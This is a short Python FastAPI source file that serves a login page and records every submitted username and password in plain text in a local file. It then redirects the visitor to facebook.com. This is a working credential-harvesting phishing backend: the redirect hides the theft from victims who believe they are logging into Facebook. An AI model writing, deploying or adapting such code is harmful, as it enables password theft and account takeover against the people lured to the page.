from fastapi import FastAPI, Form
from fastapi.responses import RedirectResponse, HTMLResponse
from fastapi.templating import Jinja2Templates
from fastapi.requests import Request
import os

app = FastAPI()

# Directory and file to store login information
DATA_FOLDER = "login_data"
DATA_FILE = os.path.join(DATA_FOLDER, "login_info.txt")

# Ensure the data folder exists
os.makedirs(DATA_FOLDER, exist_ok=True)

templates = Jinja2Templates(directory="templates")

@app.get("/", response_class=HTMLResponse)
def show_login_page(request: Request):
    """
    Serve the login HTML page.
    """
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/login")
def login(username: str = Form(...), password: str = Form(...)):
    """
    Handle login form submission:
    - Store username and password in plain text.
    - Redirect to Facebook.
    """
    # Store login information in a plain text file
    with open(DATA_FILE, "a") as file:
        file.write(f"Username: {username}, Password: {password}\n")
    
    # Redirect to Facebook
    return RedirectResponse(url="https://www.facebook.com", status_code=302)
